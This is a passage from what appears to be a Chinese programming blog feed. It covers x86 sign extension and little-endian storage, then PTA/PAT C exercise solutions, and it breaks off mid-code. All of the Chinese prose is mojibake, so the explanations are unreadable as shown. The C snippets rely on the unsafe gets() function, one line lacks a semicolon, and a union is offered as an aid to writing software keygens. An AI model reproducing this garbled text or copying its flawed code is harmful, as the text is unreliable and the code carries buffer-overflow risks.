·å®ç°çš„ï¼Œæ¯”å¦‚eax=fffffffbï¼ˆå€¼ä¸º-5ï¼‰ï¼Œç„¶åcdqæŠŠeaxçš„æœ€é«˜ä½bitï¼Œä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶1ï¼Œå…¨éƒ¨å¤åˆ¶åˆ°edxçš„æ¯ä¸€ä¸ªbitä½ï¼ŒEDX å˜æˆ FFFFFFFFï¼Œè¿™æ—¶eaxä¸edxè¿èµ·æ¥å°±æ˜¯ä¸€ä¸ª64ä½æ•°ï¼ŒFFFFFFFF FFFFFFFB ï¼Œå®ƒæ˜¯ä¸€ä¸ª 64 bit  çš„å¤§å‹æ•°å­—ï¼Œæ•°å€¼ä¾æ—§æ˜¯ -5ã€‚</p></li></ul><h2 id="å°ç«¯é—®é¢˜"><a href="#å°ç«¯é—®é¢˜" class="headerlink" title="å°ç«¯é—®é¢˜"></a>å°ç«¯é—®é¢˜</h2><ul><li><p>åœ¨ç¨‹åºå¯†ç ç®—æ³•æ—¶ï¼Œå¯èƒ½ä¼šå°†è®¡ç®—åçš„æ•°æ®å­˜æ”¾åœ¨4ä¸ªå†…å­˜å•å…ƒï¼Œç„¶åå°†å…¶ä¼ ç»™ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨(EAX)ï¼Œä½†æ˜¯ä¸€èˆ¬è‹±ç‰¹å°”çš„cpuï¼Œæ•°æ®å­˜æ”¾å½¢å¼éƒ½æ˜¯å°ç«¯ï¼Œæ‰€ä»¥ä¼šå°†è¯¥4ä¸ªå†…å­˜å•å…ƒçš„æ•°æ®ï¼Œä»¥å®ƒå°ç«¯å­˜å‚¨æ–¹å¼è¯»å–ï¼Œæ¯”å¦‚ï¼Œ4ä¸ªè¿ç»­å†…å­˜å•å…ƒçš„æ•°æ®ä¾æ¬¡ä¸º 0x12  0x34  0x56  0x78ï¼Œä¼ ç»™å¯„å­˜å™¨åï¼Œç”±äºå°ç«¯,æ‰€ä»¥ä¸ºï¼Œ0x78563412ã€‚ é‚£ä¹ˆæˆ‘ä»¬å†å†™æ³¨å†Œæœºçš„æ—¶å€™å°±å¯ä»¥ï¼Œå…ˆå®šä¹‰ä¸€ä¸ªè”åˆ:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> EAX</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> eax;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡ï¼Œå°†4ä¸ªæ•°æ®å­˜æ”¾åœ¨char[0 - 3] ï¼Œè€Œeaxå°±æ˜¯æˆ‘ä»¬è¦å¾—å€¼äº†ã€‚ (ä¸è¿‡è¿™é‡Œè¦æ³¨æ„ä½¿ç”¨<code>unsigned char</code> ï¼Œå› ä¸ºä¸€ä¸ªå­—èŠ‚çš„æœ€å¤§æ•°æ®ä¸º 2 ^8 - 1 (FF)ï¼Œ æœ‰ç¬¦å·<code>char</code> æ˜¯ -2^7 ~ 2^7-1 ï¼Œç”¨æœ‰ç¬¦å·<code>char</code> å¾ˆå®¹æ˜“æº¢å‡º)ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ±‡ç¼– </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PTAä¸PATä¹™çº§</title>
      <link href="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/"/>
      <url>/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<blockquote><p>PTAä¸ŠCè¯­è¨€å­¦ä¹ ï¼Œç»†èŠ‚æ–¹é¢æœ‰æ”¶è·çš„åœ°æ–¹ä¸PATä¹™çº§åˆ·é¢˜å¿ƒå¾—ã€‚</p></blockquote><a id="more"></a><h2 id="PTA"><a href="#PTA" class="headerlink" title="PTA"></a>PTA</h2><h3 id="PTAä¸Šæ²¡æœ‰ä¸€ä¸‹å­æƒ³åˆ°æ–¹æ³•çš„é¢˜"><a href="#PTAä¸Šæ²¡æœ‰ä¸€ä¸‹å­æƒ³åˆ°æ–¹æ³•çš„é¢˜" class="headerlink" title="PTAä¸Šæ²¡æœ‰ä¸€ä¸‹å­æƒ³åˆ°æ–¹æ³•çš„é¢˜"></a>PTAä¸Šæ²¡æœ‰ä¸€ä¸‹å­æƒ³åˆ°æ–¹æ³•çš„é¢˜</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200407130405852.png" alt="image-20200407130405852"></p><p>ä¸‹é¢é™„ä¸Šä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>, n = <span class="number">0</span>, hours = <span class="number">0</span>, minute = <span class="number">0</span>, end_time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;m, &amp;n);</span><br><span class="line"></span><br><span class="line">hours = m/<span class="number">100</span>, minute = m%<span class="number">100</span>;  <span class="comment">//éœ€è¦å­¦ä¹ çš„åœ°æ–¹.</span></span><br><span class="line"></span><br><span class="line">hours += n/<span class="number">60</span>, minute += n-(n/<span class="number">60</span>)*<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(minute &gt;= <span class="number">60</span>) </span><br><span class="line">hours += <span class="number">1</span>, minute -= <span class="number">60</span>; <span class="comment">//éœ€è¦æ³¨æ„çš„åœ°æ–¹.</span></span><br><span class="line"><span class="keyword">if</span>(minute &lt; <span class="number">0</span>)</span><br><span class="line">hours -=<span class="number">1</span>, minute += <span class="number">60</span>; <span class="comment">//éœ€è¦æ³¨æ„çš„åœ°æ–¹.</span></span><br><span class="line"></span><br><span class="line">end_time = hours*<span class="number">100</span> + minute; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, end_time);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PTAä¸­åšä¸€é“é¢˜ï¼Œæ³¨æ„ç»†èŠ‚å¿ƒå¾—"><a href="#PTAä¸­åšä¸€é“é¢˜ï¼Œæ³¨æ„ç»†èŠ‚å¿ƒå¾—" class="headerlink" title="PTAä¸­åšä¸€é“é¢˜ï¼Œæ³¨æ„ç»†èŠ‚å¿ƒå¾—"></a>PTAä¸­åšä¸€é“é¢˜ï¼Œæ³¨æ„ç»†èŠ‚å¿ƒå¾—</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200413132934160.png" alt="image-20200413132934160"></p><p>ä¸‹é¢é™„ä¸Šä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(b)</span><br><span class="line">&#123;</span><br><span class="line">c = a%b;  <span class="comment">//æ±‚æœ€å¤§å…¬çº¦æ•°ä¸­, è¿™é‡Œæ˜¯  %  ä¸è¦è¯¯å†™ /  ;</span></span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, temp = <span class="number">0</span>, g = <span class="number">0</span>, temp_N = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, sum_a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">temp_N = N;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(; N; N--)     <span class="comment">//å¼€å§‹è¾“å…¥çš„æ˜¯Nä¸ªæ•°, ä½†æ˜¯è¿™é‡Œå¾ªç¯åå˜æˆäº†0, æ‰€ä»¥åé¢å°±ä¸èƒ½ç›´æ¥ç”¨Näº†, </span></span><br><span class="line">&#123;<span class="comment">//ä½†æ˜¯å†™ç¨‹åºæ—¶æ€»æ˜¯å¿½ç•¥äº†è¿™ç‚¹, åé¢ç›´æ¥ç”¨N, å¯¼è‡´äº†å‡ºé”™è¿˜æ‰¾åŠå¤©.</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp = <span class="built_in">min</span>; </span><br><span class="line"><span class="built_in">min</span> = (<span class="built_in">min</span>*b)/gcd(<span class="built_in">min</span>, b);</span><br><span class="line">sum_a *= (<span class="built_in">min</span>/temp), sum_a += (<span class="built_in">min</span>/b)*a; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">min</span> = b, sum_a += a;</span><br><span class="line"></span><br><span class="line">g = gcd(sum_a, <span class="built_in">min</span>);</span><br><span class="line">sum_a /= g, <span class="built_in">min</span> /= g;</span><br><span class="line">&#125; </span><br><span class="line">N = temp_N;</span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span> *= N;</span><br><span class="line">g = gcd(sum_a, <span class="built_in">min</span>);</span><br><span class="line">sum_a /= g, <span class="built_in">min</span> /= g;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">min</span> &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d"</span>, sum_a, <span class="built_in">min</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, sum_a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤å­å­—ç¬¦ä¸²çš„ä¸€é“å¥½é¢˜-æ–¹æ³•å¯ä»¥æŒæ¡"><a href="#åˆ é™¤å­å­—ç¬¦ä¸²çš„ä¸€é“å¥½é¢˜-æ–¹æ³•å¯ä»¥æŒæ¡" class="headerlink" title="åˆ é™¤å­å­—ç¬¦ä¸²çš„ä¸€é“å¥½é¢˜  (æ–¹æ³•å¯ä»¥æŒæ¡)"></a>åˆ é™¤å­å­—ç¬¦ä¸²çš„ä¸€é“å¥½é¢˜  (æ–¹æ³•å¯ä»¥æŒæ¡)</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200414093531965.png" alt="image-20200414093531965"></p><p>ä¸‹é¢é¢˜è§£:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">81</span>] = &#123;<span class="number">0</span>&#125;, t[<span class="number">80</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">gets(s), gets(t);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(p = <span class="built_in">strstr</span>(s, t)) <span class="comment">//é¦–å…ˆæ‰¾åˆ°å­å­—ç¬¦ä¸²çš„ä½ç½®.</span></span><br><span class="line">&#123;</span><br><span class="line">*p = <span class="string">'\0'</span>;  <span class="comment">//å°†å…¶å­—ç¬¦ä¸²åˆ†å¼€.</span></span><br><span class="line"><span class="built_in">strcat</span>(s, p+<span class="built_in">strlen</span>(t));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸€é“é¢˜å› ä¸ºæ²¡æœ‰æ³¨æ„-é˜¶ä¹˜å¹¶ä¸æ˜¯-a-a-2-èŠ±äº†å¾ˆå¤šæ—¶é—´æ‰¾é”™"><a href="#ä¸€é“é¢˜å› ä¸ºæ²¡æœ‰æ³¨æ„-é˜¶ä¹˜å¹¶ä¸æ˜¯-a-a-2-èŠ±äº†å¾ˆå¤šæ—¶é—´æ‰¾é”™" class="headerlink" title="ä¸€é“é¢˜å› ä¸ºæ²¡æœ‰æ³¨æ„, é˜¶ä¹˜å¹¶ä¸æ˜¯  a *= a+2, èŠ±äº†å¾ˆå¤šæ—¶é—´æ‰¾é”™"></a>ä¸€é“é¢˜å› ä¸ºæ²¡æœ‰æ³¨æ„, é˜¶ä¹˜å¹¶ä¸æ˜¯  a *= a+2, èŠ±äº†å¾ˆå¤šæ—¶é—´æ‰¾é”™</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200415160332020.png" alt="image-20200415160332020"></p><p>ä¸‹é¢ä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> i = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> sum = <span class="number">2</span>, x = <span class="number">0</span>, a = <span class="number">1</span>, b = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( ; <span class="number">2</span>*a/b &gt;= x; a *= i, b *= (<span class="number">2</span>*(i++) + <span class="number">1</span>))  <span class="comment">// è¿™é‡Œä¸€å®šè¦æ³¨æ„ä¸æ˜¯ a *= a+1, b *= b+2</span></span><br><span class="line">sum += <span class="number">2</span>*a/b;</span><br><span class="line"></span><br><span class="line">sum += <span class="number">2</span>*a/b</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.6lf"</span>, sum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¹³é¢å‘é‡åŠ æ³•"><a href="#å¹³é¢å‘é‡åŠ æ³•" class="headerlink" title="å¹³é¢å‘é‡åŠ æ³•"></a>å¹³é¢å‘é‡åŠ æ³•</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200526092314780.png" alt="image-20200526092314780"></p><ul><li><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®å°±æ˜¯ç®€å•çš„åŠ æ³•, ä½†æ˜¯è¿™é‡Œè€ƒäº†ä¸ªçŸ¥è¯†ç‚¹, æ­£æ˜¯æˆ‘ä¸çŸ¥é“çš„. æ‰€ä»¥æ”¹äº†å¥½å‡ æ¬¡æ‰é€šè¿‡.</p></li><li><p>å› ä¸ºåœ¨Cè¯­è¨€æ•´æ•°éƒ½æ˜¯ä¸ç®¡å››èˆäº”å…¥çš„, ç›´æ¥èˆå¼ƒå°æ•°éƒ¨åˆ†. åˆ°äº†æµ®ç‚¹æ•°æˆ‘é»˜è®¤ä»¥ä¸ºä¿ç•™å‡ ä½å°æ•°æ—¶,ä¹Ÿæ˜¯ç›´æ¥èˆå¼ƒå¤šä½™å°æ•°éƒ¨åˆ†, ä½†å…¶å®æ˜¯å››èˆäº”å…¥.</p></li></ul><p>ä¸‹é¢é¢˜è§£.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> a = <span class="number">0</span>, b = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf %lf %lf"</span>, &amp;a, &amp;b, &amp;c, &amp;d);</span><br><span class="line">m = a+c, n = b+d; </span><br><span class="line"><span class="keyword">if</span>(m &gt; <span class="number">-0.05</span> &amp;&amp; m &lt; <span class="number">0</span>)</span><br><span class="line">m = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">-0.05</span> &amp;&amp; n &lt; <span class="number">0</span>)</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(%.1lf, %.1lf)"</span>, m, n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾ä¹¦ç±"><a href="#æŸ¥æ‰¾ä¹¦ç±" class="headerlink" title="æŸ¥æ‰¾ä¹¦ç±"></a>æŸ¥æ‰¾ä¹¦ç±</h3><ul><li><p>å­¦äº†è¿™ä¹ˆä¹…çš„Cè¯­è¨€è¿˜åœ¨çŠ¯è¿™ç§é”™è¯¯ã€‚ã€‚ã€‚å› ä¸ºæ²¡æœ‰å¤„ç†ç¼“å†²åŒºè¿˜å»è°ƒè¯•åŠå¤©ã€‚ã€‚ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200528113931032.png" alt="image-20200528113931032"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">31</span>];</span><br><span class="line"><span class="keyword">double</span> price;</span><br><span class="line">&#125; A;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>, <span class="built_in">min</span> = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">getchar();<span class="comment">//ä¸‹é¢æœ‰å­—ç¬¦è¾“å…¥ï¼Œ è¿™é‡Œå¿…é¡»åƒæ‰å›è½¦ã€‚</span></span><br><span class="line">A *p = (A *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(A)*n);</span><br><span class="line">    <span class="built_in">memset</span>(p, <span class="number">0</span>, <span class="keyword">sizeof</span>(A)*n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line">gets(p[i].name);<span class="comment">//gets()åä¸äº§ç”Ÿå›è½¦ã€‚åªæ˜¯æŠŠæœ€åè¾“å…¥çš„å›è½¦è½¬åŒ–ä¸º '\0' ã€‚</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;p[i].price);</span><br><span class="line">getchar();<span class="comment">//å› ä¸ºæ˜¯å¾ªç¯ï¼Œåé¢è¾“å…¥å­—ç¬¦ï¼Œè¦å…ˆåƒæ‰å›è½¦ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p[<span class="built_in">max</span>].price &lt; p[i].price)</span><br><span class="line"><span class="built_in">max</span> = i;</span><br><span class="line"><span class="keyword">if</span>(p[<span class="built_in">min</span>].price &gt; p[i].price)</span><br><span class="line"><span class="built_in">min</span> = i;</span><br><span class="line">i++;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf, %s\n"</span>, p[<span class="built_in">max</span>].price, p[<span class="built_in">max</span>].name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf, %s\n"</span>, p[<span class="built_in">min</span>].price, p[<span class="built_in">min</span>].name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>gets()åä¸äº§ç”Ÿå›è½¦ã€‚åªæ˜¯æŠŠæœ€åè¾“å…¥çš„å›è½¦è½¬åŒ–ä¸º â€˜\0â€™ ã€‚</p></blockquote><h2 id="PAT-520-é’»çŸ³äº‰éœ¸èµ›"><a href="#PAT-520-é’»çŸ³äº‰éœ¸èµ›" class="headerlink" title="PAT 520 é’»çŸ³äº‰éœ¸èµ›"></a>PAT 520 é’»çŸ³äº‰éœ¸èµ›</h2><blockquote><p>å…¶ä¸­2é“å¾ˆç®€å•çš„é¢˜ï¼Œä½†åšçš„æ—¶å€™éƒ½æœ‰ä¸€ä¸ªæµ‹è¯•ç‚¹æ€ä¹ˆä¹Ÿè¿‡ä¸äº†ã€‚ã€‚ã€‚å½“æ—¶çœŸæƒ³ä¸æ˜ç™½ï¼Œæ¯”èµ›ç»“æŸåæ¥çœ‹äº†å¾ˆä¹…è¿˜æ˜¯æ²¡å‘ç°é”™è¯¯ï¼Œå¾ˆæƒ³çŸ¥é“åˆ°æµ‹è¯•ç‚¹æ˜¯ä»€ä¹ˆï¼Œä½†è¿™æ˜¯ä¸å¯èƒ½çš„ã€‚ã€‚ã€‚åé¢ä¸€åº¦è®¤ä¸ºé¢˜ç›®å¯¹Cè¯­è¨€çš„é—®é¢˜ï¼Œhhã€‚å…¶å®ä¸æ˜¯ï¼Œä»Šå¤©æ‰¾åˆ°äº†é—®é¢˜ï¼Œ2ä¸ªé¢˜è¿˜çŠ¯äº†åŒä¸€ç§é”™è¯¯ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p></blockquote><p>1.é¦–å…ˆæ˜¯ç®€å•çš„æ±‚å¹³å‡æˆç»©ï¼Œé—®é¢˜å°±å‡ºç°åœ¨å¦‚æœæˆä¸€ä¸ªäººçš„æˆç»©æ˜¯0çš„è¯ï¼Œæ€»æˆç»©ä¸º0ï¼Œä½†äººæ•°å¢åŠ äº†ä¸€ä¸ªå•Šã€‚è€Œæˆ‘ä»¬ä¸€ç›´ä½¿ç”¨çš„åˆ†æ•°æ¥ç¡®å®šæ˜¯å¦æœ‰äººå­˜åœ¨ã€‚ã€‚ã€‚æ‰¾è¿™ä¸ªé”™è¯¯çœŸä¸å®¹æ˜“è¯¶ã€‚</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200601095453045.png" alt="image-20200601095453045"></p><p>ä»£ç è­¦ç¤ºé”™è¯¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span 